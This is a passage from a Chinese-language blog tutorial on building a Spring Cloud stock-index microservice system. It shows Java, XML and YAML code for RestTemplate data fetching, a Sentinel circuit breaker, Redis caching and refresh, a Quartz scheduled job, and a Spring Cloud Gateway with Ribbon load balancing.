data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200728205151084.png" alt="指数数据"></p><p>其中<code>date</code> 表示成交日， <code>closePoint</code> 表示收盘价。</p><p><strong>注：</strong> 从真正的第三方拿到的数据结构会更复杂，比如会带上 <code>pb,pe</code> 等等各式各样的金融指标。</p><h2 id="采集和存储服务"><a href="#采集和存储服务" class="headerlink" title="采集和存储服务"></a>采集和存储服务</h2><p><span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL3RyZW5kL3RyZW5kLTIwODkvMjA4OS5odG1s">第三方数据服务<i class="fa fa-external-link-alt"></i></span> 的数据其实是存放在第三方的，今天能访问，明天或许就不能访问了，所以我们就需要把它采集下来，并且存储在本地。</p><p>采集使用的是 <code>RestTemplate</code> 方式来做， 存储本地我们会采用 <code>redis</code> 来保存。</p><blockquote><p>service层：将Json数据取回是Map对象，需要专为pojo对象</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*private List&lt;Index&gt; indexes;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Index&gt; <span class="title">fetch_indexes_from_third_part</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//获取出来的内容是Map类型，所以需要个 map2Index把 Map 转换为 Index。</span></span><br><span class="line">        List&lt;Map&gt; temp = restTemplate.getForObject(</span><br><span class="line">                <span class="string">"http://127.0.0.1:8090/indexes/codes.json"</span>, List<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="keyword">return</span> map2Index(temp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> List&lt;Index&gt; <span class="title">map2Index</span><span class="params">(List&lt;Map&gt; temp)</span></span>&#123;</span><br><span class="line">        <span class="comment">//map转index</span></span><br><span class="line">        List&lt;Index&gt; indexList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map map :</span><br><span class="line">                temp) &#123;</span><br><span class="line">            String code = map.get(<span class="string">"code"</span>).toString();</span><br><span class="line">            String name = map.get(<span class="string">"name"</span>).toString();</span><br><span class="line">            Index index = <span class="keyword">new</span> Index();</span><br><span class="line">            index.setCode(code);</span><br><span class="line">            index.setName(name);</span><br><span class="line">            indexList.add(index);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> indexList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="断路器"><a href="#断路器" class="headerlink" title="断路器"></a>断路器</h2><p>我这里使用<code>Sentinel</code>作为断路器，并使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvU2VudGluZWwvd2lraS8lRTUlQTYlODIlRTQlQkQlOTUlRTQlQkQlQkYlRTclOTQlQTg=">注解定义资源<i class="fa fa-external-link-alt"></i></span></p><p>具体的注解参数参照<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvU2VudGluZWwvd2lraS8lRTYlQjMlQTglRTglQTclQTMlRTYlOTQlQUYlRTYlOEMlODE=">@SentinelResource 注解<i class="fa fa-external-link-alt"></i></span></p><blockquote><p>引入Sentinel的POM</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-sentinel<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>首先启动Sentinel的dashboard，注意指定端口</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -Dserver.port=8088 -jar sentinel-dashboard-1.3.0.jar</span><br></pre></td></tr></table></figure><blockquote><p>对<strong>目标服务</strong>添加注解，这里有个坑，必须添加value才能使用，并且保证fallback函数的输入输出参数完全一致</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SentinelResource</span>(value = <span class="string">"fetchIndexesFromThirdPart"</span>, fallback = <span class="string">"fallBackMethod"</span>) <span class="comment">//降级策略</span></span><br></pre></td></tr></table></figure><h2 id="采集和存储Redis"><a href="#采集和存储Redis" class="headerlink" title="采集和存储Redis"></a>采集和存储Redis</h2><p>使用Win版<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pY3Jvc29mdGFyY2hpdmUvcmVkaXMvcmVsZWFzZXM=">Redis<i class="fa fa-external-link-alt"></i></span>，使得加载一次数据后，后面可以从<code>redis</code>获取数据</p><blockquote><p>POM添加Redis支持</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- redis --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>启动类开启缓存注解</p></blockquote><p>增加 <code>@EnableCaching</code> 表示启动缓存</p><blockquote><p>Service层增加注解</p></blockquote><p>增加 <code>@CacheConfig(cacheNames=&quot;indexes&quot;)</code> 表示缓存的名称是 indexes.</p><p>在fetch_indexes_from_third_part 方法上增加： <code>@Cacheable(key=&quot;&#39;all_codes&#39;&quot;)</code> 表示保存到 redis 用的 key 就会使 all_codes.（<strong>注意双引号里面的单引号</strong>）</p><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200730095946586.png" alt="redis截图"></p><blockquote><p>what fuck，被墙了？</p></blockquote><h2 id="Redis刷新"><a href="#Redis刷新" class="headerlink" title="Redis刷新"></a>Redis刷新</h2><p>如果第三方能用，就把数据放在 redis里了。如果第三方不能用，就把断路数据放在 redis 里了。</p><p>以后无论第三方是否有变化， 因为 redis 里面已经有数据了，所以下一次访问，以及以后的所有访问都会从 redis 里获取数据了。 这就带来了数据无法刷新的问题。</p><p><strong>刷新的思路就是</strong>：</p><ol><li>先运行 fetch_indexes_from_third_part 来获取数据</li><li>删除上一次<code>redis</code>的数据</li><li>保存新的数据数据</li><li>从而达到刷新的效果</li></ol><blockquote><p>增加<code>util.SpringContextUtil</code>类</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tosang.springcloud.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeansException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContextAware;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2020/7/30 10:09</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringContextUtil</span> <span class="keyword">implements</span> <span class="title">ApplicationContextAware</span> </span>&#123;</span><br><span class="line">    <span class="comment">//这个类用于获取Spring上下文</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ApplicationContext applicationContext;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SpringContextUtil</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"This is SpringContextUtil()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setApplicationContext</span><span class="params">(ApplicationContext applicationContext)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ApplicationContext: "</span>+ applicationContext);</span><br><span class="line">        SpringContextUtil.applicationContext = applicationContext;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">getBean</span><span class="params">(Class&lt;T&gt; clazz)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> applicationContext.getBean(clazz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>改造<code>IndexService</code>类</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2020/7/29 8:46</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@CacheConfig</span>(cacheNames=<span class="string">"indexes"</span>) <span class="comment">//缓存名称</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;Index&gt; indexes;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SentinelResource</span>(value = <span class="string">"fetchIndexesFromThirdPart"</span>, fallback = <span class="string">"fallBackMethod"</span>) <span class="comment">//降级策略</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Index&gt; <span class="title">fresh</span><span class="params">()</span></span>&#123; <span class="comment">//刷新redis</span></span><br><span class="line">        indexes = fetchIndexesFromThirdPart();</span><br><span class="line">        IndexService bean = SpringContextUtil.getBean(IndexService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        bean.remove();</span><br><span class="line">        <span class="keyword">return</span> bean.store();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Index&gt; <span class="title">fetchIndexesFromThirdPart</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取出来的内容是Map类型，所以需要个 map2Index把 Map 转换为 Index。</span></span><br><span class="line">        List&lt;Map&gt; temp = restTemplate.getForObject(</span><br><span class="line">                <span class="string">"http://127.0.0.1:8090/indexes/codes.json"</span>, List<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="keyword">return</span> map2Index(temp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@CacheEvict</span>(allEntries = <span class="keyword">true</span>) <span class="comment">//清空所有缓存</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Cacheable</span>(key=<span class="string">"'all_codes'"</span>) <span class="comment">//获取数据，这个就是专门用来从 redis 中获取数据</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Index&gt; <span class="title">get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> CollectionUtil.toList();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Cacheable</span>(key=<span class="string">"'all_codes'"</span>) <span class="comment">//保存数据，这个专门用来往 redis 里保存数据</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Index&gt; <span class="title">store</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"This is "</span> + <span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">return</span> indexes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*降级策略*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Index&gt; <span class="title">fallBackMethod</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"third_part_not_connected()"</span>);</span><br><span class="line">        Index index= <span class="keyword">new</span> Index();</span><br><span class="line">        index.setCode(<span class="string">"000000"</span>);</span><br><span class="line">        index.setName(<span class="string">"获取不到数据，无效指数代码"</span>);</span><br><span class="line">        <span class="keyword">return</span> CollectionUtil.toList(index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> List&lt;Index&gt; <span class="title">map2Index</span><span class="params">(List&lt;Map&gt; temp)</span></span>&#123;</span><br><span class="line">        <span class="comment">//map转index</span></span><br><span class="line">        List&lt;Index&gt; indexList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map map :</span><br><span class="line">                temp) &#123;</span><br><span class="line">            String code = map.get(<span class="string">"code"</span>).toString();</span><br><span class="line">            String name = map.get(<span class="string">"name"</span>).toString();</span><br><span class="line">            Index index = <span class="keyword">new</span> Index();</span><br><span class="line">            index.setCode(code);</span><br><span class="line">            index.setName(name);</span><br><span class="line">            indexList.add(index);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> indexList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>控制层</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2020/7/29 9:01</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line">    <span class="comment">//  http://127.0.0.1:8001/freshcodes</span></span><br><span class="line">    <span class="comment">//  http://127.0.0.1:8001/getcodes</span></span><br><span class="line">    <span class="comment">//  http://127.0.0.1:8001/removecodes</span></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    IndexService indexService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/freshcodes"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Index&gt; <span class="title">fresh</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> indexService.fresh();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/getcodes"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Index&gt; <span class="title">getCodes</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> indexService.get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/removecodes"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">removecodes</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        indexService.remove();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"remove codes successfully"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：Spring AOP<strong>无法拦截内部的方法调用</strong>，所以无法执行一系列拦截代理操作。换言之，实际调用的是this.remove,而不是proxy.remove，<strong>Spring的注解处理器就无法生效</strong>，但是通过代理方法获得类的方式时就可以正确的执行注解处理器的操作。</p><p>关于spring 缓存中<code>@Cacheable</code>、<code>@CachePut</code>和<code>@CacheEvict</code>介绍 以及<code>#p0</code>的含义，参照</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5NjYzMDcxL2FydGljbGUvZGV0YWlscy84MTUxMTg0NQ==">https://blog.csdn.net/qq_29663071/article/details/81511845<i class="fa fa-external-link-alt"></i></span></p><h2 id="采集和存储指数数据"><a href="#采集和存储指数数据" class="headerlink" title="采集和存储指数数据"></a>采集和存储指数数据</h2><p>和指数名称的采集类似，稍作修改即可。</p><h2 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h2><p>第三方的数据一般说来每天都会更新。 按照前面的做法，需要访问 fresh 地址才能实现刷新的效果，难道每天都自己手动去刷新吗？ 这也很繁琐嘛，何况很有可能会忘记。<br>所以我们就引入定时器工具 <code>Quartz</code> 来解决这个问题吧</p><p>关于<code>Quartz</code>的使用参照：<span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL3F1YXJ0ei9xdWFydHotc3RhcnQvMTcwNy5odG1sI25vd2hlcmU=">https://how2j.cn/k/quartz/quartz-start/1707.html#nowhere<i class="fa fa-external-link-alt"></i></span></p><blockquote><p>编写任务Job</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2020/7/31 10:04</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexDataSyncJob</span> <span class="keyword">extends</span> <span class="title">QuartzJobBean</span> </span>&#123;</span><br><span class="line">    <span class="comment">//任务类，同时刷新指数代码和指数数据。</span></span><br><span class="line">    <span class="comment">//相当于将该任务声明为一个Job类型任务</span></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> IndexService indexService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> IndexDataService indexDataService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">executeInternal</span><span class="params">(JobExecutionContext jobExecutionContext)</span> <span class="keyword">throws</span> JobExecutionException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"任务启动："</span> + DateUtil.now());</span><br><span class="line">        List&lt;Index&gt; indexList = indexService.fresh();</span><br><span class="line">        <span class="keyword">for</span> (Index index:</span><br><span class="line">             indexList) &#123;</span><br><span class="line">            indexDataService.fresh(index.getCode());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"任务结束："</span>+ DateUtil.now());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>配置类</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2020/7/31 10:12</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QuartzConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//暂停分钟数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> INTERVAL = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> JobDetail <span class="title">weatherDataSyncJobDetail</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//创建Job ----&gt; 做什么</span></span><br><span class="line">        <span class="keyword">return</span> JobBuilder</span><br><span class="line">                .newJob(IndexDataSyncJob<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line">                .withIdentity("indexDataSyncJob")</span><br><span class="line">                .storeDurably()</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Trigger <span class="title">weatherDataSyncTrigger</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//创建Trigger并绑定Job ---&gt; 什么时候做</span></span><br><span class="line">        SimpleScheduleBuilder simpleScheduleBuilder = SimpleScheduleBuilder</span><br><span class="line">                .simpleSchedule()</span><br><span class="line">                .withIntervalInMinutes(INTERVAL)</span><br><span class="line">                .repeatForever();</span><br><span class="line">        <span class="keyword">return</span> TriggerBuilder</span><br><span class="line">                .newTrigger()</span><br><span class="line">                .forJob(weatherDataSyncJobDetail())</span><br><span class="line">                .withIdentity(<span class="string">"indexDataSyncTrigger"</span>)</span><br><span class="line">                .withSchedule(simpleScheduleBuilder)</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里设计为1分钟执行一次任务</p><h2 id="指数代码微服务"><a href="#指数代码微服务" class="headerlink" title="指数代码微服务"></a>指数代码微服务</h2><p>为什么不直接用采集和存储服务提供呢？ 采集和存储服务已经提供了web接口， 干嘛要专门提供一个微服务来获取指数代码？<br>原因有两个：</p><ol><li>采集和存储服务本身定位是在采集和存储服务上，其提供的web接口只是为了调试用，其定位不是用于提供指数数据的。</li><li>为了使用集群，<strong>指数代码微服务会有多个</strong>， 而<strong>采集和存储服务并非不能做集群</strong>，但是它里面有定时器，如果也做成集群，就会有多个定时器同时工作，一起向第三方获取数据，一起把数据保存到 redis里。 这样不仅是额外的开销，也埋下了出现数据冲突的风险。<br>所以会专门有一个微服务来单纯地提供指数代码。</li></ol><blockquote><p>什么是跨域请求：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9hMTViYjc5YmZmYjA=">https://www.jianshu.com/p/a15bb79bffb0<i class="fa fa-external-link-alt"></i></span></p></blockquote><p>流程：index-codes-service服务 <strong>请求redis服务</strong> &lt;—–&gt; redis(由采集和存储服务添加)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//集群 http://127.0.0.1:9011/codes</span></span><br><span class="line"><span class="comment">//集群 http://127.0.0.1:9012/codes</span></span><br><span class="line"><span class="comment">//集群 http://127.0.0.1:9013/codes</span></span><br></pre></td></tr></table></figure><h2 id="指数数据微服务"><a href="#指数数据微服务" class="headerlink" title="指数数据微服务"></a>指数数据微服务</h2><p>思路同指数代码微服务</p><h2 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h2><p>通常我们如果有一个服务，会部署到多台服务器上，这些微服务如果都暴露给客户，是非常难以管理的，我们系统需要有一个唯一的出口，API网关是一个服务，是系统的唯一出口。API网关封装了系统内部的微服务，为客户端提供一个定制的API。客户端只需要调用网关接口，就可以调用到实际的微服务，实际的服务对客户不可见，并且容易扩展服务。</p><p>API网关可以结合ribbon完成负载均衡的功能，可以自动检查微服务的状况，及时剔除或者加入某个微服务到可用服务列表。此外网关可以完成权限检查、限流、统计等功能。下面我们将一一完成上面的功能。注意微服务只是提供rest的接口，不会有额外的组件依赖，不需要eureka等。只需要两个工程，一个是微服务，我们可以部署到多台服务器，那么只是访问的ip不同，在演示的时候，我们在本机演示，修改端口，达到启动多个微服务的目的，另一个就是网关，主要是<code>spring cloud gateway</code> 和 <code>ribbon</code>两大组件来实现网关和负载均衡等功能（<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veWUtZmVuZy15dS9wLzExMTA2MDA2Lmh0bWw=">参考<i class="fa fa-external-link-alt"></i></span>）</p><blockquote><p>首先引入所需依赖</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--gateway 网关--&gt;</span> </span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-gateway<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--nacos client--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--Ribben，要实现网关的负载均衡，必须要添加这个--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-ribbon<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>YML配置</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">locator:</span></span><br><span class="line">          <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">gateway_route</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://index-codes-service</span> <span class="comment">#关键：必须添加ribben的lb才能实现通过服务名进行负载均衡							#//后面index-codes-service是注册在nacos的服务名</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/api-codes/**</span> <span class="comment">#断言：浏览器访问方式</span></span><br><span class="line">          <span class="attr">filters:</span> </span><br><span class="line">            <span class="bullet">-</span> <span class="string">StripPrefix=1</span>  <span class="comment">#过滤第一个前缀，即上面的/api-codes/部分</span></span><br><span class="line">            <span class="comment">#过滤的作用是因为浏览器访问127.0.0.1:8031/api-codes/**时，网关会转发到nacos上的对应服务，必须要将多余的关键字/api-codes/去除</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">index-gateway-service</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8031</span></span><br></pre></td></tr></table></figure><p>网关测试测试：<span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDMxL2FwaS1jb2Rlcy9jb2Rlcw==">http://127.0.0.1:8031/api-codes/codes<i class="fa fa-external-link-alt"></i></span> 。默认采用<strong>轮询算法</strong></p><h2 id="模拟回测服务"><a href="#模拟回测服务" class="headerlink" title="模拟回测服务"></a>模拟回测服务</h2><p>在模拟回测视图那里需要很多的数据，这些数据都是从这个模拟回测服务里产生的。 虽然现在看上去只有单纯的指数原数据，但是随着业务的增加，功能的迭代，会有越来越丰富的数据产生出来啦。</p><blockquote><p>在这个模块中新增了<code>openfeign</code>，替代rest Template使用。</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>开启feign模式的断路器</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span 